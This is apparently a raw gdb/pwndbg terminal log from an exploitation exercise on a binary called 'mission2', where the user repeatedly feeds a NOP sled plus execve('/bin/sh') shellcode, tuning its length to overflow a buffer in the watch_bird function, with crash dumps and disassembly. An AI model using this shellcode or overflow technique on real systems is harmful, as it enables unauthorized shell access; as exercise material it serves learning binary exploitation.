@@ -1,0 +1,2106 @@
+ Command 'dab' from package 'bsdgames' (universe)
+ Command 'gdb' from package 'gdb' (main)
+ Command 'mgb' from package 'mathicgb' (universe)
+dgb: command not found
+m843367@bin:~/mission2$ gdb missio2
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 177 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+missio2: No such file or directory.
+pwndbg> Quit
+pwndbg> quit
+warning: Could not rename /home/m843367/mission2/.gdb_history-gdb16562~ to /home/m843367/mission2/.gdb_history: No such file or directory
+m843367@bin:~/mission2$ clear
+
+m843367@bin:~/mission2$ gdb mission2 
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 177 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from mission2...(no debugging symbols found)...done.
+pwndbg> set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + 
+pwndbg> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + 
+Undefined command: "".  Try "help".
+pwndbg> "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Undefined command: "".  Try "help".
+pwndbg> set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + 
+pwndbg> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + 
+Undefined command: "".  Try "help".
+pwndbg> "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Undefined command: "".  Try "help".
+pwndbg> clear
+No source file specified.
+pwndbg> 
+No source file specified.
+pwndbg> 
+No source file specified.
+pwndbg> 
+No source file specified.
+pwndbg> 
+No source file specified.
+pwndbg> 
+No source file specified.
+pwndbg> 
+No source file specified.
+pwndbg> 
+No source file specified.
+pwndbg> 
+No source file specified.
+pwndbg> set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + 
+pwndbg> 
+pwndbg> 
+pwndbg> 
+pwndbg> 
+pwndbg> set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + 
+pwndbg> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + 
+Undefined command: "".  Try "help".
+pwndbg> set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + 
+pwndbg> "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Undefined command: "".  Try "help".
+pwndbg> 
+Undefined command: "".  Try "help".
+pwndbg> 
+Undefined command: "".  Try "help".
+pwndbg> 
+Undefined command: "".  Try "help".
+pwndbg> 
+Undefined command: "".  Try "help".
+pwndbg> set args
+pwndbg> clear
+No source file specified.
+pwndbg> 
+pwndbg> set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + 
+pwndbg> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + 
+Undefined command: "".  Try "help".
+pwndbg> "\x80\xe8\xdc\xff\xff\xff/bin/sh")')set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + 
+Undefined command: "".  Try "help".
+pwndbg> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + 
+Undefined command: "".  Try "help".
+pwndbg> "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Undefined command: "".  Try "help".
+pwndbg> set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+pwndbg> set args < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*152 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+
+Program received signal SIGSEGV, Segmentation fault.
+__strcmp_sse4_2 () at ../sysdeps/i386/i686/multiarch/strcmp-sse4.S:229
+229	../sysdeps/i386/i686/multiarch/strcmp-sse4.S: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x90909090
+ EBX  0x0
+ ECX  0xd08
+ EDX  0xc568d08
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0xbb00c46
+ ESP  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+ EIP  0xf7f50187 (__strcmp_sse4_2+23) ◂— movdqu xmm2, xmmword ptr [edx]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+ ► 0xf7f50187 <__strcmp_sse4_2+23>     movdqu xmm2, xmmword ptr [edx]
+   0xf7f5018b <__strcmp_sse4_2+27>     mov    ecx, eax
+   0xf7f5018d <__strcmp_sse4_2+29>     and    ecx, 0xfff
+   0xf7f50193 <__strcmp_sse4_2+35>     cmp    ecx, 0xff0
+   0xf7f50199 <__strcmp_sse4_2+41>     ja     __strcmp_sse4_2+99 <0xf7f501d3>
+    ↓
+   0xf7f501d3 <__strcmp_sse4_2+99>     movzx  ecx, byte ptr [eax]
+   0xf7f501d6 <__strcmp_sse4_2+102>    cmp    byte ptr [edx], cl
+   0xf7f501d8 <__strcmp_sse4_2+104>    jne    __strcmp_sse4_2+432 <0xf7f50320>
+    ↓
+   0xf7f50320 <__strcmp_sse4_2+432>    mov    eax, 1
+   0xf7f50325 <__strcmp_sse4_2+437>    ja     __strcmp_sse4_2+441 <0xf7f50329>
+    ↓
+   0xf7f50329 <__strcmp_sse4_2+441>    ret    
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+01:0004│      0xffffc4d0 ◂— 0xc568d08
+02:0008│      0xffffc4d4 —▸ 0xffffc578 ◂— 0x90909090
+03:000c│      0xffffc4d8 —▸ 0xffffc598 ◂— 0xcd40d889
+04:0010│      0xffffc4dc ◂— 0x2710
+05:0014│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+06:0018│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0 f7f50187 __strcmp_sse4_2+23
+   f 1  8048757 watch_bird+100
+   f 2 4e8df389
+   f 3  c568d08
+   f 4 db3180cd
+   f 5 cd40d889
+Program received signal SIGSEGV (fault address 0xc568d08)
+pwndbg> set args < <(python -c 'print("\x90"*128 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*128 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+
+Program received signal SIGSEGV, Segmentation fault.
+__strcmp_sse4_2 () at ../sysdeps/i386/i686/multiarch/strcmp-sse4.S:229
+229	../sysdeps/i386/i686/multiarch/strcmp-sse4.S: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0xc568d08
+ EBX  0x0
+ ECX  0x68
+ EDX  0x8040068
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x622fffff
+ ESP  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+ EIP  0xf7f50187 (__strcmp_sse4_2+23) ◂— movdqu xmm2, xmmword ptr [edx]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+ ► 0xf7f50187 <__strcmp_sse4_2+23>     movdqu xmm2, xmmword ptr [edx]
+   0xf7f5018b <__strcmp_sse4_2+27>     mov    ecx, eax
+   0xf7f5018d <__strcmp_sse4_2+29>     and    ecx, 0xfff
+   0xf7f50193 <__strcmp_sse4_2+35>     cmp    ecx, 0xff0
+   0xf7f50199 <__strcmp_sse4_2+41>     ja     __strcmp_sse4_2+99 <0xf7f501d3>
+    ↓
+   0xf7f501d3 <__strcmp_sse4_2+99>     movzx  ecx, byte ptr [eax]
+   0xf7f501d6 <__strcmp_sse4_2+102>    cmp    byte ptr [edx], cl
+   0xf7f501d8 <__strcmp_sse4_2+104>    jne    __strcmp_sse4_2+432 <0xf7f50320>
+    ↓
+   0xf7f50320 <__strcmp_sse4_2+432>    mov    eax, 1
+   0xf7f50325 <__strcmp_sse4_2+437>    ja     __strcmp_sse4_2+441 <0xf7f50329>
+    ↓
+   0xf7f50329 <__strcmp_sse4_2+441>    ret    
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+01:0004│      0xffffc4d0 ◂— 0x8040068 /* 'h' */
+02:0008│      0xffffc4d4 —▸ 0xffffc578 ◂— 0xc568d08
+03:000c│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+04:0010│      0xffffc4dc ◂— 0x2710
+05:0014│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+06:0018│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0 f7f50187 __strcmp_sse4_2+23
+   f 1  8048757 watch_bird+100
+   f 2 732f6e69
+   f 3  8040068
+   f 4        0
+Program received signal SIGSEGV (fault address 0x8040068)
+pwndbg> set args < <(python -c 'print("\x90"*124 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*124 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+�����������������������������������������������������������������������������������������������������������������������������^�1��F�F
+                                               �
+                                                ���V
+                                                    1ۉ�@̀�����/bin/shwait what you doing?!
+[Inferior 1 (process 20430) exited with code 0377]
+pwndbg> set args < <(python -c 'print("\x90"*125 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*125 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+������������������������������������������������������������������������������������������������������������������������������^�1��F�F
+                                                �
+                                                 ���V
+                                                     1ۉ�@̀�����/bin/shwait what you doing?!
+[Inferior 1 (process 20519) exited with code 0377]
+pwndbg> set args < <(python -c 'print("\x90"*130 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> 
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*130 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+
+Program received signal SIGSEGV, Segmentation fault.
+__strcmp_sse4_2 () at ../sysdeps/i386/i686/multiarch/strcmp-sse4.S:229
+229	../sysdeps/i386/i686/multiarch/strcmp-sse4.S: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x8d084e8d
+ EBX  0x0
+ ECX  0x32f
+ EDX  0x68732f
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0xffffffdc
+ ESP  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+ EIP  0xf7f50187 (__strcmp_sse4_2+23) ◂— movdqu xmm2, xmmword ptr [edx]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+ ► 0xf7f50187 <__strcmp_sse4_2+23>     movdqu xmm2, xmmword ptr [edx]
+   0xf7f5018b <__strcmp_sse4_2+27>     mov    ecx, eax
+   0xf7f5018d <__strcmp_sse4_2+29>     and    ecx, 0xfff
+   0xf7f50193 <__strcmp_sse4_2+35>     cmp    ecx, 0xff0
+   0xf7f50199 <__strcmp_sse4_2+41>     ja     __strcmp_sse4_2+99 <0xf7f501d3>
+    ↓
+   0xf7f501d3 <__strcmp_sse4_2+99>     movzx  ecx, byte ptr [eax]
+   0xf7f501d6 <__strcmp_sse4_2+102>    cmp    byte ptr [edx], cl
+   0xf7f501d8 <__strcmp_sse4_2+104>    jne    __strcmp_sse4_2+432 <0xf7f50320>
+    ↓
+   0xf7f50320 <__strcmp_sse4_2+432>    mov    eax, 1
+   0xf7f50325 <__strcmp_sse4_2+437>    ja     __strcmp_sse4_2+441 <0xf7f50329>
+    ↓
+   0xf7f50329 <__strcmp_sse4_2+441>    ret    
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+01:0004│      0xffffc4d0 ◂— 0x68732f /* '/sh' */
+02:0008│      0xffffc4d4 —▸ 0xffffc578 ◂— 0x8d084e8d
+03:000c│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+04:0010│      0xffffc4dc ◂— 0x2710
+05:0014│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+06:0018│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0 f7f50187 __strcmp_sse4_2+23
+   f 1  8048757 watch_bird+100
+   f 2 6e69622f
+   f 3   68732f
+   f 4        0
+Program received signal SIGSEGV (fault address 0x68732f)
+pwndbg> set args < <(python -c 'print("\x90"*129 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*129 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+
+Program received signal SIGSEGV, Segmentation fault.
+__strcmp_sse4_2 () at ../sysdeps/i386/i686/multiarch/strcmp-sse4.S:229
+229	../sysdeps/i386/i686/multiarch/strcmp-sse4.S: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0x568d084e
+ EBX  0x0
+ ECX  0x873
+ EDX  0x8006873
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x2fffffff
+ ESP  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+ EIP  0xf7f50187 (__strcmp_sse4_2+23) ◂— movdqu xmm2, xmmword ptr [edx]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+ ► 0xf7f50187 <__strcmp_sse4_2+23>     movdqu xmm2, xmmword ptr [edx]
+   0xf7f5018b <__strcmp_sse4_2+27>     mov    ecx, eax
+   0xf7f5018d <__strcmp_sse4_2+29>     and    ecx, 0xfff
+   0xf7f50193 <__strcmp_sse4_2+35>     cmp    ecx, 0xff0
+   0xf7f50199 <__strcmp_sse4_2+41>     ja     __strcmp_sse4_2+99 <0xf7f501d3>
+    ↓
+   0xf7f501d3 <__strcmp_sse4_2+99>     movzx  ecx, byte ptr [eax]
+   0xf7f501d6 <__strcmp_sse4_2+102>    cmp    byte ptr [edx], cl
+   0xf7f501d8 <__strcmp_sse4_2+104>    jne    __strcmp_sse4_2+432 <0xf7f50320>
+    ↓
+   0xf7f50320 <__strcmp_sse4_2+432>    mov    eax, 1
+   0xf7f50325 <__strcmp_sse4_2+437>    ja     __strcmp_sse4_2+441 <0xf7f50329>
+    ↓
+   0xf7f50329 <__strcmp_sse4_2+441>    ret    
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+01:0004│      0xffffc4d0 ◂— 0x8006873 /* 'sh' */
+02:0008│      0xffffc4d4 —▸ 0xffffc578 ◂— 0x568d084e
+03:000c│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+04:0010│      0xffffc4dc ◂— 0x2710
+05:0014│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+06:0018│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0 f7f50187 __strcmp_sse4_2+23
+   f 1  8048757 watch_bird+100
+   f 2 2f6e6962
+   f 3  8006873
+   f 4        0
+Program received signal SIGSEGV (fault address 0x8006873)
+pwndbg> set args < <(python -c 'print("\x90"*127 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*127 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+��������������������������������������������������������������������������������������������������������������������������������^�1��F�F
+                                                  �
+                                                   ���V
+                                                       1ۉ�@̀�����/bin/shwait what you doing?!
+[Inferior 1 (process 20573) exited with code 0377]
+pwndbg> set args < <(python -c 'print("\x90"*128 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*128 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+
+Program received signal SIGSEGV, Segmentation fault.
+__strcmp_sse4_2 () at ../sysdeps/i386/i686/multiarch/strcmp-sse4.S:229
+229	../sysdeps/i386/i686/multiarch/strcmp-sse4.S: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0xc568d08
+ EBX  0x0
+ ECX  0x68
+ EDX  0x8040068
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x622fffff
+ ESP  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+ EIP  0xf7f50187 (__strcmp_sse4_2+23) ◂— movdqu xmm2, xmmword ptr [edx]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+ ► 0xf7f50187 <__strcmp_sse4_2+23>     movdqu xmm2, xmmword ptr [edx]
+   0xf7f5018b <__strcmp_sse4_2+27>     mov    ecx, eax
+   0xf7f5018d <__strcmp_sse4_2+29>     and    ecx, 0xfff
+   0xf7f50193 <__strcmp_sse4_2+35>     cmp    ecx, 0xff0
+   0xf7f50199 <__strcmp_sse4_2+41>     ja     __strcmp_sse4_2+99 <0xf7f501d3>
+    ↓
+   0xf7f501d3 <__strcmp_sse4_2+99>     movzx  ecx, byte ptr [eax]
+   0xf7f501d6 <__strcmp_sse4_2+102>    cmp    byte ptr [edx], cl
+   0xf7f501d8 <__strcmp_sse4_2+104>    jne    __strcmp_sse4_2+432 <0xf7f50320>
+    ↓
+   0xf7f50320 <__strcmp_sse4_2+432>    mov    eax, 1
+   0xf7f50325 <__strcmp_sse4_2+437>    ja     __strcmp_sse4_2+441 <0xf7f50329>
+    ↓
+   0xf7f50329 <__strcmp_sse4_2+441>    ret    
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4cc —▸ 0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+01:0004│      0xffffc4d0 ◂— 0x8040068 /* 'h' */
+02:0008│      0xffffc4d4 —▸ 0xffffc578 ◂— 0xc568d08
+03:000c│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+04:0010│      0xffffc4dc ◂— 0x2710
+05:0014│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+06:0018│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0 f7f50187 __strcmp_sse4_2+23
+   f 1  8048757 watch_bird+100
+   f 2 732f6e69
+   f 3  8040068
+   f 4        0
+Program received signal SIGSEGV (fault address 0x8040068)
+pwndbg> set args < <(python -c 'print("\x90"*127 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+pwndbg> run
+Starting program: /home/m843367/mission2/mission2 < <(python -c 'print("\x90"*127 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" + "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" + "\x80\xe8\xdc\xff\xff\xff/bin/sh")')
+Tell me: what bird are you watching?
+��������������������������������������������������������������������������������������������������������������������������������^�1��F�F
+                                                  �
+                                                   ���V
+                                                       1ۉ�@̀�����/bin/shwait what you doing?!
+[Inferior 1 (process 20643) exited with code 0377]
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x08048793 <+0>:	lea    ecx,[esp+0x4]
+   0x08048797 <+4>:	and    esp,0xfffffff0
+   0x0804879a <+7>:	push   DWORD PTR [ecx-0x4]
+   0x0804879d <+10>:	push   ebp
+   0x0804879e <+11>:	mov    ebp,esp
+   0x080487a0 <+13>:	push   ecx
+   0x080487a1 <+14>:	sub    esp,0x14
+   0x080487a4 <+17>:	call   0x8048460 <clearenv@plt>
+   0x080487a9 <+22>:	call   0x804861b <make_bird>
+   0x080487ae <+27>:	mov    DWORD PTR [ebp-0xc],eax
+   0x080487b1 <+30>:	sub    esp,0xc
+   0x080487b4 <+33>:	push   DWORD PTR [ebp-0xc]
+   0x080487b7 <+36>:	call   0x80486f3 <watch_bird>
+   0x080487bc <+41>:	add    esp,0x10
+   0x080487bf <+44>:	sub    esp,0xc
+   0x080487c2 <+47>:	push   DWORD PTR [ebp-0xc]
+   0x080487c5 <+50>:	call   0x8048480 <free@plt>
+   0x080487ca <+55>:	add    esp,0x10
+   0x080487cd <+58>:	mov    eax,0x0
+   0x080487d2 <+63>:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x080487d5 <+66>:	leave  
+   0x080487d6 <+67>:	lea    esp,[ecx-0x4]
+   0x080487d9 <+70>:	ret    
+End of assembler dump.
+pwndbg> b*0x080487ae
+Breakpoint 1 at 0x80487ae
